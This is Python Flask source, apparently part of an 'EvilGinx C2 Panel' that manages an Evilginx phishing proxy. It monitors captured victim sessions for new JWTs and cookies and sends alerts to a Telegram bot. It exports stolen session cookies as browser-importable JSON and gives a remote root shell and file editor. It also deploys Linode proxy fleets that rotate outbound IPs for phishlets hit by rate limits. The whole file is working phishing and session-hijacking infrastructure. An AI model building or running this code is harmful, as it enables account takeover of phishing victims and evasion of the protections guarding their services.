            now = {}
            changed = []
            for s in sessions:
                sid = s.get("id")
                jwt = bool(s.get("has_jwt"))
                nc = int(s.get("n_cookies") or 0)
                sig = (jwt, nc, int(s.get("update_time") or 0))
                now[sid] = sig
                if not seeded:
                    continue
                old = prev.get(sid)
                if old == sig:
                    continue
                gained_jwt = jwt and (not old or not old[0])
                gained_ck = nc > 0 and (not old or nc > (old[1] or 0))
                if gained_jwt or gained_ck or (old is None and (jwt or nc > 0)):
                    changed.append({
                        "id": sid,
                        "has_jwt": jwt,
                        "n_cookies": nc,
                        "phishlet": s.get("phishlet") or "",
                    })
            prev = now
            seeded = True
            if changed:
                try:
                    socketio.emit("session_live", {"sessions": changed[-8:]})
                except Exception:
                    pass
        except Exception:
            time.sleep(2)

@app.route("/api/notifications", methods=["GET", "POST"])
@auth
def api_notifications():
    if request.method == "GET":
        s = _read_notif_settings()
        s["sent_count"] = len(_read_sent_ids())
        return jsonify(s)
    d = request.get_json()
    s = _read_notif_settings()
    for k in ("bot_token", "chat_id"):
        if k in d:
            s[k] = d[k].strip()
    for k in ("enabled", "notify_jwt", "notify_tokens"):
        if k in d:
            s[k] = bool(d[k])
    _write_notif_settings(s)
    return jsonify(ok=True, msg="Settings saved.")

@app.route("/api/notifications/test", methods=["POST"])
@auth
def api_notifications_test():
    s = _read_notif_settings()
    if not s.get("bot_token") or not s.get("chat_id"):
        return jsonify(error="Bot token and Chat ID required"), 400
    text = "🤖 <b>Evilginx Panel</b>\n\nTest notification.\nBot is connected and working! ✅"
    result, err = _send_telegram(s["bot_token"], s["chat_id"], text)
    if err:
        return jsonify(error=f"Telegram error: {err}"), 500
    return jsonify(ok=True, msg="Test message sent!")

@app.route("/api/notifications/reset", methods=["POST"])
@auth
def api_notifications_reset():
    _write_sent_ids(set())
    return jsonify(ok=True, msg="Sent IDs reset. All sessions with tokens will be re-sent.")

# ═══════════════════════════════════════════════════════════════════════════════
#  API — FILE EXPLORER
# ═══════════════════════════════════════════════════════════════════════════════

def _fs_safe(p):
    p = os.path.abspath(os.path.expanduser(p or "/root"))
    if not p.startswith("/"):
        p = "/" + p
    return p

def _is_probably_text(path, max_check=8000):
    try:
        with open(path, "rb") as f:
            chunk = f.read(max_check)
        if b"\x00" in chunk:
            return False
        chunk.decode("utf-8")
        return True
    except Exception:
        return False

@app.route("/api/fs")
@auth
def api_fs_list():
    path = _fs_safe(request.args.get("path", "/root"))
    if not os.path.isdir(path):
        return jsonify(error="Not a directory"), 400
    entries = []
    try:
        names = os.listdir(path)
    except PermissionError:
        return jsonify(error="Permission denied"), 403
    except Exception as e:
        return jsonify(error=str(e)), 500
    for name in names:
        fp = os.path.join(path, name)
        try:
            st = os.lstat(fp)
        except Exception:
            continue
        is_dir = os.path.isdir(fp)
        is_link = os.path.islink(fp)
        entries.append({
            "name": name,
            "path": fp,
            "is_dir": is_dir,
            "is_link": is_link,
            "size": 0 if is_dir else st.st_size,
            "mtime": int(st.st_mtime),
            "mode": oct(st.st_mode)[-3:],
        })
    entries.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
    parent = os.path.dirname(path.rstrip("/")) or "/"
    if path == "/":
        parent = "/"
    return jsonify(path=path, parent=parent, entries=entries)

@app.route("/api/fs/read")
@auth
def api_fs_read():
    path = _fs_safe(request.args.get("path", ""))
    if not path or not os.path.isfile(path):
        return jsonify(error="File not found"), 404
    if not _is_probably_text(path):
        return jsonify(error="Binary file — cannot open in editor"), 400
    try:
        raw = open(path, "rb").read()
        text = raw.decode("utf-8", errors="replace")
    except Exception as e:
        return jsonify(error=str(e)), 500
    if len(text) > 2_000_000:
        return jsonify(error="File too large to edit (>2MB)"), 400
    return jsonify(path=path, content=text, size=len(raw))

@app.route("/api/fs/write", methods=["PUT"])
@auth
def api_fs_write():
    d = request.get_json() or {}
    path = _fs_safe(d.get("path", ""))
    if not path:
        return jsonify(error="Path required"), 400
    parent = os.path.dirname(path)
    if not os.path.isdir(parent):
        return jsonify(error="Parent directory missing"), 400
    content = d.get("content", "")
    if not isinstance(content, str):
        return jsonify(error="Content must be text"), 400
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
    except Exception as e:
        return jsonify(error=str(e)), 500
    return jsonify(ok=True, path=path)

@app.route("/api/fs/mkdir", methods=["POST"])
@auth
def api_fs_mkdir():
    d = request.get_json() or {}
    path = _fs_safe(d.get("path", ""))
    if not path:
        return jsonify(error="Path required"), 400
    try:
        os.makedirs(path, exist_ok=False)
    except FileExistsError:
        return jsonify(error="Already exists"), 409
    except Exception as e:
        return jsonify(error=str(e)), 500
    return jsonify(ok=True)

@app.route("/api/fs/delete", methods=["POST"])
@auth
def api_fs_delete():
    d = request.get_json() or {}
    path = _fs_safe(d.get("path", ""))
    if not path or path in ("/", "/root"):
        return jsonify(error="Refusing to delete this path"), 400
    try:
        if os.path.isdir(path) and not os.path.islink(path):
            os.rmdir(path)
        else:
            os.remove(path)
    except Exception as e:
        return jsonify(error=str(e)), 500
    return jsonify(ok=True)


# ═══════════════════════════════════════════════════════════════════════════════
#  API — SERVICES
# ═══════════════════════════════════════════════════════════════════════════════

def _systemctl(*args, timeout=20):
    r = subprocess.run(
        ["systemctl", *args],
        capture_output=True, text=True, timeout=timeout
    )
    return r.returncode, r.stdout or "", r.stderr or ""

def _ensure_mysql_connector():
    """Make sure /usr/bin/python3 can import mysql.connector (systemd units use it)."""
    py = "/usr/bin/python3"
    check = [py, "-c", "import mysql.connector"]
    try:
        if subprocess.run(check, capture_output=True, timeout=20).returncode == 0:
            return
    except Exception:
        pass
    cmds = [
        [py, "-m", "pip", "install", "mysql-connector-python"],
        ["pip3", "install", "mysql-connector-python", "--break-system-packages"],
        [py, "-m", "pip", "install", "mysql-connector-python", "--break-system-packages"],
        ["pip3", "install", "mysql-connector-python"],
    ]
    for cmd in cmds:
        try:
            subprocess.run(cmd, capture_output=True, timeout=300)
            if subprocess.run(check, capture_output=True, timeout=20).returncode == 0:
                return
        except Exception:
            continue

def _svc_name_ok(name):
    return bool(re.match(r"^[a-zA-Z0-9][a-zA-Z0-9_.-]*$", name or ""))

def _svc_unit(name):
    name = (name or "").replace(".service", "")
    return name, name + ".service"

def _svc_info(name):
    name, unit = _svc_unit(name)
    _, active, _ = _systemctl("is-active", unit)
    _, enabled, _ = _systemctl("is-enabled", unit)
    code, show, _ = _systemctl("show", unit,
        "--property=Description,FragmentPath,User,ExecMainPID,ActiveState,SubState,UnitFileState,WorkingDirectory")
    props = {}
    for line in show.splitlines():
        if "=" in line:
            k, v = line.split("=", 1)
            props[k] = v
    custom = props.get("FragmentPath", "").startswith("/etc/systemd/system/")
    return {
        "name": name,
        "unit": unit,
        "description": props.get("Description", ""),
        "active": active.strip(),
        "enabled": enabled.strip(),
        "sub": props.get("SubState", ""),
        "pid": props.get("ExecMainPID", "0"),
        "user": props.get("User", ""),
        "path": props.get("FragmentPath", ""),
        "workdir": props.get("WorkingDirectory", ""),
        "custom": custom,
    }

@app.route("/api/services")
@auth
def api_services():
    filt = request.args.get("filter", "running")  # running|all|custom
    if filt == "custom":
        units = []
        d = "/etc/systemd/system"
        if os.path.isdir(d):
            for fn in os.listdir(d):
                if not fn.endswith(".service"):
                    continue
                fp = os.path.join(d, fn)
                if os.path.islink(fp):
                    continue
                if not os.path.isfile(fp):
                    continue
                units.append(fn[:-8])
        units = sorted(set(units))
    else:
        args = ["list-units", "--type=service", "--no-pager", "--plain", "--no-legend", "--full"]
        if filt == "running":
            args.append("--state=running")
        else:
            args.append("--all")
        code, out, err = _systemctl(*args, timeout=25)
        units = []
        for line in out.splitlines():
            line = line.strip()
            if not line:
                continue
            unit = line.split()[0]
            if unit.endswith(".service"):
                units.append(unit[:-8])
            elif unit:
                units.append(unit.replace(".service", ""))
        units = units[:250]
    result = []
    for n in units:
        try:
            result.append(_svc_info(n))
        except Exception:
            continue
    return jsonify(result)

@app.route("/api/services/<name>")
@auth
def api_service_one(name):
    if not _svc_name_ok(name.replace(".service", "")):
        return jsonify(error="Bad name"), 400
    return jsonify(_svc_info(name))

@app.route("/api/services/<name>/logs")
@auth
def api_service_logs(name):
    name, unit = _svc_unit(name)
    if not _svc_name_ok(name):
        return jsonify(error="Bad name"), 400
    n = request.args.get("n", "80")
    try:
        n = max(10, min(int(n), 400))
    except Exception:
        n = 80
    r = subprocess.run(
        ["journalctl", "-u", unit, "-n", str(n), "--no-pager", "-o", "short-iso"],
        capture_output=True, text=True, timeout=20
    )
    return jsonify(logs=r.stdout or r.stderr or "")

@app.route("/api/services/<name>/<action>", methods=["POST"])
@auth
def api_service_action(name, action):
    name, unit = _svc_unit(name)
    if not _svc_name_ok(name):
        return jsonify(error="Bad name"), 400
    if action not in ("start", "stop", "restart", "enable", "disable"):
        return jsonify(error="Bad action"), 400
    code, out, err = _systemctl(action, unit)
    if action in ("enable", "disable"):
        _systemctl("daemon-reload")
    if code != 0:
        return jsonify(error=(err or out or "failed").strip()), 500
    return jsonify(ok=True, **_svc_info(name))

@app.route("/api/services", methods=["POST"])
@auth
def api_service_create():
    d = request.get_json() or {}
    name = (d.get("name") or "").strip().replace(".service", "")
    if not _svc_name_ok(name):
        return jsonify(error="Invalid service name"), 400
    src = _fs_safe(d.get("file") or "")
    if not src or not os.path.isfile(src):
        return jsonify(error="Script file not found"), 400
    desc = (d.get("description") or name + " service").strip()
    user = (d.get("user") or "root").strip() or "root"
    workdir = _fs_safe(d.get("workdir") or os.path.dirname(src) or "/root")
    copy_bin = bool(d.get("copy_to_bin"))
    interp = (d.get("interpreter") or "auto").strip().lower()
    do_enable = bool(d.get("enable", True))
    do_start = bool(d.get("start", True))

    dest = src
    if copy_bin:
        dest = os.path.join("/usr/local/bin", os.path.basename(src))
        import shutil
        shutil.copy2(src, dest)
        os.chmod(dest, 0o755)
    else:
        try:
            os.chmod(src, os.stat(src).st_mode | 0o111)
        except Exception:
            pass

    if dest.endswith(".py"):
        _ensure_mysql_connector()

    py = "/usr/bin/python3"
    if os.path.isfile("/root/evilginx-panel/venv/bin/python"):
        # keep system python for user scripts unless they are panel venv
        pass
    if interp == "auto":
        if dest.endswith(".py"):
            exec_start = f"{py} {dest}"
        elif dest.endswith(".sh"):
            exec_start = f"/bin/bash {dest}"
        else:
            exec_start = dest
    elif interp == "python3":
        exec_start = f"{py} {dest}"
    elif interp == "bash":
        exec_start = f"/bin/bash {dest}"
    else:
        exec_start = dest

    unit_path = f"/etc/systemd/system/{name}.service"
    body = (
        "[Unit]\n"
        f"Description={desc}\n"
        "After=network.target\n"
        "\n"
        "[Service]\n"
        f"User={user}\n"
        f"ExecStart={exec_start}\n"
        f"WorkingDirectory={workdir}\n"
        "Restart=always\n"
        "RestartSec=5\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    )
    with open(unit_path, "w") as f:
        f.write(body)
    _systemctl("daemon-reload")
    if do_enable:
        code, out, err = _systemctl("enable", name + ".service")
        if code != 0:
            return jsonify(error="enable failed: " + (err or out)), 500
    if do_start:
        code, out, err = _systemctl("start", name + ".service")
        if code != 0:
            return jsonify(error="start failed: " + (err or out), unit=body), 500
    return jsonify(ok=True, **_svc_info(name), unit_body=body)

@app.route("/api/services/<name>", methods=["DELETE"])
@auth
def api_service_delete(name):
    name, unit = _svc_unit(name)
    if not _svc_name_ok(name):
        return jsonify(error="Bad name"), 400
    info = _svc_info(name)
    path = info.get("path") or f"/etc/systemd/system/{unit}"
    if not path.startswith("/etc/systemd/system/"):
        return jsonify(error="Can only delete custom units in /etc/systemd/system/"), 400
    _systemctl("stop", unit)
    _systemctl("disable", unit)
    try:
        if os.path.isfile(path):
            os.remove(path)
    except Exception as e:
        return jsonify(error=str(e)), 500
    _systemctl("daemon-reload")
    return jsonify(ok=True)

# ═══════════════════════════════════════════════════════════════════════════════
#  API — SESSIONS
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/api/sessions")
@auth
def api_sessions():
    all_ss = _parse_sessions()
    counts = {
        "all":     len(all_ss),
        "jwt":     sum(1 for s in all_ss if s.get("has_jwt")),
        "tokens":  sum(1 for s in all_ss if (s.get("n_cookies") or 0) > 0),
        "empty":   sum(1 for s in all_ss if (s.get("n_cookies") or 0) == 0),
    }
    ss = all_ss
    filt = request.args.get("filter", "all")
    if filt == "tokens":
        ss = [s for s in ss if s["n_cookies"] > 0]
    elif filt == "empty":
        ss = [s for s in ss if s["n_cookies"] == 0]
    elif filt == "jwt":
        ss = [s for s in ss if s["has_jwt"]]
    for s in ss:
        s.pop("tokens", None)
    return jsonify(sessions=ss, counts=counts)

@app.route("/api/sessions/<int:sid>")
@auth
def api_session_detail(sid):
    for s in _parse_sessions():
        if s["id"] == sid:
            return jsonify(s)
    return jsonify(error="Not found"), 404


@app.route("/api/sessions/<int:sid>", methods=["DELETE"])
@auth
def api_session_delete(sid):
    found = any(s["id"] == sid for s in _parse_sessions())
    if not found:
        return jsonify(error="Not found"), 404
    try:
        egm.write("sessions delete %s\n" % sid)
    except Exception:
        pass
    _db_delete_ids([sid])
    return jsonify(ok=True)

@app.route("/api/sessions/clear", methods=["POST"])
@auth
def api_sessions_clear():
    d = request.get_json(silent=True) or {}
    pw = d.get("password", "")
    if pw != PANEL_PASS:
        return jsonify(error="Wrong password"), 403
    was_running = egm.alive()
    if was_running:
        egm.stop()
        time.sleep(1)
    _db_clear_sessions()
    if was_running:
        egm.start()
        time.sleep(1)
    return jsonify(ok=True, msg="All sessions cleared")


# ═══════════════════════════════════════════════════════════════════════════════
#  API — EVILGINX CONTROL
# ═══════════════════════════════════════════════════════════════════════════════


@app.route("/api/sessions/<int:sid>/cookies.json")
@auth
def api_session_cookies_json(sid):
    for s in _parse_sessions():
        if s["id"] == sid:
            cookies = _tokens_to_browser_format(s.get("tokens", {}), s.get("phishlet", ""))
            resp = app.response_class(
                response=json.dumps(cookies, indent=4),
                mimetype="application/json",
                headers={"Content-Disposition": f"attachment; filename=session_{sid}_cookies.json"}
            )
            return resp
    return jsonify(error="Not found"), 404

@app.route("/api/ev/status")
@auth
def api_ev_status():
    return jsonify(running=egm.alive(), pid=egm.pid())

@app.route("/api/ev/start", methods=["POST"])
@auth
def api_ev_start():
    egm.start()
    time.sleep(2)
    return jsonify(ok=True, running=egm.alive(), pid=egm.pid())

@app.route("/api/ev/stop", methods=["POST"])
@auth
def api_ev_stop():
    egm.stop()
    return jsonify(ok=True)

@app.route("/api/ev/restart", methods=["POST"])
@auth
def api_ev_restart():
    egm.restart()
    time.sleep(2)
    return jsonify(ok=True, running=egm.alive(), pid=egm.pid())

# ═══════════════════════════════════════════════════════════════════════════════
#  API — HEALTH (cheap /proc reads, only while the page is open)
# ═══════════════════════════════════════════════════════════════════════════════

_health_lock = threading.Lock()
_health_cache = {"t": 0.0, "data": None}
_cpu_sample = None   # (mono, total, idle)
_net_sample = None   # (mono, rx, tx)


def _fmt_bytes(n):
    n = float(n or 0)
    for u in ("B", "KB", "MB", "GB", "TB"):
        if abs(n) < 1024 or u == "TB":
            if u == "B":
                return "%d %s" % (int(n), u)
            return "%.1f %s" % (n, u)
        n /= 1024.0
    return "%.1f TB" % n


def _cpu_times():
    with open("/proc/stat") as f:
        parts = f.readline().split()
    nums = [int(x) for x in parts[1:]]
    idle = nums[3] + (nums[4] if len(nums) > 4 else 0)
    return sum(nums), idle


def _net_bytes():
    rx = tx = 0
    with open("/proc/net/dev") as f:
        for line in f:
            if ":" not in line:
                continue
            name, rest = line.split(":", 1)
            name = name.strip()
            if not name or name == "lo":
                continue
            cols = rest.split()
            if len(cols) < 10:
                continue
            rx += int(cols[0])
            tx += int(cols[8])
    return rx, tx


def _meminfo():
    info = {}
    with open("/proc/meminfo") as f:
        for line in f:
            if ":" not in line:
                continue
            k, v = line.split(":", 1)
            info[k] = int(v.strip().split()[0]) * 1024
    total = info.get("MemTotal", 0)
    avail = info.get("MemAvailable", info.get("MemFree", 0))
    used = max(0, total - avail)
    pct = (used / total * 100.0) if total else 0.0
    return total, used, avail, pct


def _disk_root():
    st = os.statvfs("/")
    total = st.f_frsize * st.f_blocks
    free = st.f_frsize * st.f_bavail
    used = max(0, total - free)
    pct = (used / total * 100.0) if total else 0.0
    return total, used, free, pct


def _loadavg():
    with open("/proc/loadavg") as f:
        a, b, c = f.read().split()[:3]
    return float(a), float(b), float(c)


def _cpu_model():
    try:
        with open("/proc/cpuinfo") as f:
            for line in f:
                if line.lower().startswith("model name"):
                    return line.split(":", 1)[1].strip()
    except Exception:
        pass
    return ""


def _uptime_sec():
    with open("/proc/uptime") as f:
        return float(f.read().split()[0])


def _health_grade(pct):
    if pct >= 92:
        return "critical"
    if pct >= 80:
        return "warning"
    return "healthy"


def _health_collect():
    global _cpu_sample, _net_sample
    t0 = time.monotonic()
    total, idle = _cpu_times()
    rx, tx = _net_bytes()
    now = time.monotonic()

    cpu_pct = 0.0
    if _cpu_sample is None:
        time.sleep(0.04)
        total2, idle2 = _cpu_times()
        now = time.monotonic()
        dt, di = total2 - total, idle2 - idle
        cpu_pct = 0.0 if dt <= 0 else max(0.0, min(100.0, (1.0 - (di / float(dt))) * 100.0))
        _cpu_sample = (now, total2, idle2)
    else:
        pt, ptot, pidle = _cpu_sample
        dt, di = total - ptot, idle - pidle
        cpu_pct = 0.0 if dt <= 0 else max(0.0, min(100.0, (1.0 - (di / float(dt))) * 100.0))
        _cpu_sample = (now, total, idle)

    net_in_bps = net_out_bps = 0.0
    if _net_sample is not None:
        pt, prx, ptx = _net_sample
        dt = max(0.001, now - pt)
        net_in_bps = max(0.0, (rx - prx) / dt)
        net_out_bps = max(0.0, (tx - ptx) / dt)
    _net_sample = (now, rx, tx)

    mem_total, mem_used, mem_avail, mem_pct = _meminfo()
    disk_total, disk_used, disk_free, disk_pct = _disk_root()
    l1, l5, l15 = _loadavg()
    cores = os.cpu_count() or 1
    cpu_status = _health_grade(cpu_pct)
    ram_status = _health_grade(mem_pct)
    disk_status = _health_grade(disk_pct)
    net_busy = (net_in_bps + net_out_bps) > (50 * 1024 * 1024)
    net_status = "warning" if net_busy else "healthy"
    worst = "healthy"
    for s in (cpu_status, ram_status, disk_status, net_status):
        if s == "critical":
            worst = "critical"
        elif s == "warning" and worst != "critical":
            worst = "warning"
    if worst == "critical":
        summary = "System under pressure"
    elif worst == "warning":
        summary = "Some metrics are elevated"
    else:
        summary = "All systems nominal — everything is running smoothly"

    return {
        "status": worst,
        "summary": summary,
        "took_ms": round((time.monotonic() - t0) * 1000, 1),
        "ts": int(time.time()),
        "hostname": os.uname().nodename,
        "uptime": _uptime_sec(),
        "cores": cores,
        "cpu_model": _cpu_model(),
        "load": [round(l1, 2), round(l5, 2), round(l15, 2)],
        "cpu_pct": round(cpu_pct, 1),
        "cpu_status": cpu_status,
        "ram": {
            "total": mem_total, "used": mem_used, "free": mem_avail,
            "pct": round(mem_pct, 1), "status": ram_status,
            "total_h": _fmt_bytes(mem_total), "used_h": _fmt_bytes(mem_used),
        },
        "disk": {
            "total": disk_total, "used": disk_used, "free": disk_free,
            "pct": round(disk_pct, 1), "status": disk_status,
            "total_h": _fmt_bytes(disk_total), "used_h": _fmt_bytes(disk_used),
            "free_h": _fmt_bytes(disk_free),
        },
        "net": {
            "in_bps": round(net_in_bps), "out_bps": round(net_out_bps),
            "in_h": _fmt_bytes(net_in_bps) + "/s",
            "out_h": _fmt_bytes(net_out_bps) + "/s",
            "rx_total_h": _fmt_bytes(rx), "tx_total_h": _fmt_bytes(tx),
            "status": net_status,
        },
    }


@app.route("/api/health")
@auth
def api_health():
    now = time.monotonic()
    with _health_lock:
        if _health_cache["data"] is not None and (now - _health_cache["t"]) < 0.9:
            return jsonify(_health_cache["data"])
        data = _health_collect()
        _health_cache["t"] = time.monotonic()
        _health_cache["data"] = data
        return jsonify(data)


# ═══════════════════════════════════════════════════════════════════════════════
#  WEBSOCKET — TERMINAL
# ═══════════════════════════════════════════════════════════════════════════════

@socketio.on("term_in")
def ws_term_in(data):
    if not session.get("ok"):
        return
    egm.write(data.get("d", ""))

@socketio.on("term_resize")
def ws_term_resize(data):
    if not session.get("ok"):
        return
    egm.resize(data.get("rows", 24), data.get("cols", 80))

@socketio.on("shell_in")
def ws_shell_in(data):
    if not session.get("ok"):
        return
    shm.write((data or {}).get("d", ""))

@socketio.on("shell_resize")
def ws_shell_resize(data):
    if not session.get("ok"):
        return
    data = data or {}
    shm.resize(data.get("rows", 24), data.get("cols", 80))

@socketio.on("shell_attach")
def ws_shell_attach(data=None):
    if not session.get("ok"):
        return
    data = data or {}
    was_alive = shm.alive()
    shm.ensure()
    if data.get("replay") and was_alive and shm.output_buffer:
        emit("shell_out", {"d": "".join(shm.output_buffer[-200:])})

@socketio.on("shell_restart")
def ws_shell_restart():
    if not session.get("ok"):
        return
    shm.restart()

@socketio.on("connect")
def ws_connect():
    if not session.get("ok"):
        return False
    if egm.output_buffer:
        emit("term_out", {"d": "".join(egm.output_buffer[-200:])})

@socketio.on("disconnect")
def ws_disconnect():
    try:
        jnl.stop(sid=request.sid)
    except Exception:
        pass

@socketio.on("journal_start")
def ws_journal_start(data):
    if not session.get("ok"):
        return
    name = ((data or {}).get("unit") or "").replace(".service", "")
    if not _svc_name_ok(name):
        emit("journal_out", {"d": "[invalid unit name]\r\n"})
        return
    _, unit = _svc_unit(name)
    jnl.start(unit, request.sid)

@socketio.on("journal_stop")
def ws_journal_stop():
    if not session.get("ok"):
        return
    try:
        jnl.stop(sid=request.sid)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════════════════
#  NOTIFICATION CENTRE  +  LINODE PROXY FLEET
# ═══════════════════════════════════════════════════════════════════════════════

NC_FILE = os.path.join(os.path.dirname(EVILGINX_CONFIG), "panel_notifications.json")
PROXY_FILE = os.path.join(os.path.dirname(EVILGINX_CONFIG), "linode_proxy.json")
_nc_lock = threading.Lock()

def _nc_load():
    if os.path.isfile(NC_FILE):
        try:
            return json.load(open(NC_FILE))
        except Exception:
            pass
    return {"items": [], "seq": 1}

def _nc_save(d):
    with open(NC_FILE, "w") as f:
        json.dump(d, f)

def nc_push(title, message, ntype="info"):
    with _nc_lock:
        d = _nc_load()
        item = {
            "id": d.get("seq", 1),
            "title": title,
            "message": message,
            "type": ntype,
            "ts": int(time.time()),
            "read": False,
        }
        d["seq"] = item["id"] + 1
        d.setdefault("items", []).insert(0, item)
        d["items"] = d["items"][:300]
        _nc_save(d)
    try:
        socketio.emit("nc_new", item)
    except Exception:
        pass
    try:
        ns = _read_notif_settings()
        if ns.get("enabled") and ns.get("bot_token") and ns.get("chat_id"):
            _send_telegram(ns["bot_token"], ns["chat_id"], f"<b>{title}</b>\n{message}")
    except Exception:
        pass
    return item

import proxy_engine as pxe
pxe.init(PROXY_FILE, PHISHLETS_DIR, EVILGINX_CONFIG, nc_push)
pxe.start_sidecar()


@app.route("/api/nc")
@auth
def api_nc_list():
    d = _nc_load()
    items = d.get("items") or []
    unread = sum(1 for i in items if not i.get("read"))
    return jsonify(items=items[:80], unread=unread)


@app.route("/api/nc/read", methods=["POST"])
@auth
def api_nc_read():
    data = request.get_json(force=True) or {}
    with _nc_lock:
        d = _nc_load()
        if data.get("all"):
            for i in d.get("items") or []:
                i["read"] = True
        else:
            nid = data.get("id")
            for i in d.get("items") or []:
                if i.get("id") == nid:
                    i["read"] = True
        _nc_save(d)
    return jsonify(ok=True)


@app.route("/api/nc/clear", methods=["POST"])
@auth
def api_nc_clear():
    with _nc_lock:
        d = _nc_load()
        d["items"] = [i for i in d.get("items") or [] if not i.get("read")]
        _nc_save(d)
    return jsonify(ok=True)


@app.route("/api/proxy/key", methods=["GET", "POST"])
@auth
def api_proxy_key():
    if request.method == "GET":
        s = pxe.load()
        return jsonify(configured=bool(s.get("api_key")), allow_ip=pxe.public_ipv4())
    data = request.get_json(force=True) or {}
    key = (data.get("api_key") or "").strip()
    if not key:
        return jsonify(ok=False, error="API key is incorrect")
    ok, err = pxe.validate_key(key)
    if not ok:
        return jsonify(ok=False, error="API key is incorrect")
    s = pxe.load()
    s["api_key"] = key
    pxe.save(s)
    nc_push("Linode connected", "API key accepted. You can deploy Nanode proxies.", "success")
    return jsonify(ok=True)


@app.route("/api/proxy/regions")
@auth
def api_proxy_regions():
    try:
        return jsonify(pxe.list_regions())
    except Exception as e:
        return jsonify(error=str(e))


@app.route("/api/proxy/state")
@auth
def api_proxy_state():
    st = pxe.public_state()
    proxies = list(st.get("proxies") or [])
    light = (request.args.get("light") or "") in ("1", "true", "yes")

    def _enrich(p):
        panel_status = p.get("status")
        ready = p.get("ready")
        if p.get("id"):
            m = pxe.instance_metrics(p["id"], with_stats=not light)
            if light:
                if m.get("error"):
                    p["metrics_error"] = m["error"]
                if m.get("linode_status"):
                    p["linode_status"] = m["linode_status"]
                if m.get("ipv4"):
                    p["ipv4"] = m["ipv4"]
            else:
                if m.get("error"):
                    p["metrics_error"] = m["error"]
                for k, v in m.items():
                    if k in ("error", "status"):
                        continue
                    p[k] = v
        p["status"] = panel_status
        p["ready"] = ready if ready is not None else (panel_status == "active")
        return p

    if len(proxies) > 1:
        with ThreadPoolExecutor(max_workers=min(8, len(proxies))) as pool:
            metrics = list(pool.map(_enrich, proxies))
    else:
        metrics = [_enrich(p) for p in proxies]
    st["proxies"] = metrics
    resp = jsonify(st)
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@app.route("/api/proxy/deploy", methods=["POST"])
@auth
def api_proxy_deploy():
    data = request.get_json(force=True) or {}
    count = int(data.get("count") or 0)
    regions = data.get("regions") or []
    if count < 1:
        return jsonify(error="server count required")
    if not regions:
        return jsonify(error="pick at least one region")
    if len(regions) > count:
        return jsonify(error="cannot pick more regions than servers")
    s = pxe.load()
    if s.get("deploy", {}).get("running"):
        return jsonify(error="deploy already running")
    pxe.deploy_async(count, regions, restart_egx=lambda: egm.restart())
    return jsonify(ok=True)


@app.route("/api/proxy/assign", methods=["POST"])
@auth
def api_proxy_assign():
    data = request.get_json(force=True) or {}
    ph = data.get("phishlet") or ""
    ids = data.get("ids") or []
    if not ph or not re.match(r"^[a-zA-Z0-9_\-]+$", ph):
        return jsonify(error="invalid phishlet")
    st = pxe.assign(ph, ids)
    try:
        egm.restart()
    except Exception:
        pass
    nc_push("Proxy assignment", f"{ph} → {len(ids)} proxy(ies). Evilginx restarted to apply outbound tunnel.", "info")
    return jsonify(ok=True, **st)


@app.route("/api/proxy/detach", methods=["POST"])
@auth
def api_proxy_detach():
    data = request.get_json(force=True) or {}
    ph = data.get("phishlet") or ""
    ids = data.get("ids") or []
    if not ph or not re.match(r"^[a-zA-Z0-9_\-]+$", ph):
        return jsonify(error="invalid phishlet")
    if not ids:
        return jsonify(error="select proxy to detach")
    st = pxe.detach(ph, ids)
    nc_push("Proxy detached", f"{ph}: removed {len(ids)} proxy(ies). Live tunnels closed — next request uses the server IP or remaining pool.", "info")
    return jsonify(ok=True, **st)


@app.route("/api/proxy/repair", methods=["POST"])
@auth
def api_proxy_repair():
    data = request.get_json(force=True) or {}
    lid = data.get("id")
    if not lid:
        return jsonify(error="id required")
    try:
        pxe.repair_async(lid)
        return jsonify(ok=True)
    except Exception as e:
        return jsonify(error=str(e))


@app.route("/api/proxy/destroy", methods=["POST"])
@auth
def api_proxy_destroy():
    data = request.get_json(force=True) or {}
    lid = data.get("id")
    if not lid:
        return jsonify(error="id required")
    try:
        st = pxe.destroy_instance(lid)
        return jsonify(ok=True, **st)
    except Exception as e:
        return jsonify(error=str(e))


@app.route("/api/proxy/power", methods=["POST"])
@auth
def api_proxy_power():
    data = request.get_json(force=True) or {}
    lid = data.get("id")
    action = (data.get("action") or "").strip().lower()
    if not lid:
        return jsonify(error="id required")
    if action not in ("start", "stop", "restart"):
        return jsonify(error="action must be start, stop or restart")
    try:
        st = pxe.power_instance(lid, action)
        return jsonify(ok=True, **st)
    except Exception as e:
        return jsonify(error=str(e))


@app.route("/api/internal/egx-429", methods=["POST"])
def api_egx_429():
    if request.remote_addr not in ("127.0.0.1", "::1"):
        return jsonify(error="forbidden"), 403
    data = request.get_json(force=True, silent=True) or {}
    return jsonify(pxe.record_auth_429(data.get("phishlet") or "", data.get("host") or "", data.get("path") or ""))


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════


import threading as _thr
_notif_thread = _thr.Thread(target=_notif_monitor_loop, daemon=True)
_notif_thread.start()
_live_thread = _thr.Thread(target=_session_live_loop, daemon=True)
_live_thread.start()

if __name__ == "__main__":
    egm.start()
    time.sleep(2)
    print(f"\n\033[92m[*] EvilGinx C2 Panel\033[0m")
    print(f"\033[92m[*] http://0.0.0.0:{PANEL_PORT}\033[0m")
    print(f"\033[92m[*] EvilGinx PID: {egm.pid()}\033[0m\n")
    socketio.run(app, host=PANEL_HOST, port=PANEL_PORT,
                 allow_unsafe_werkzeug=True)
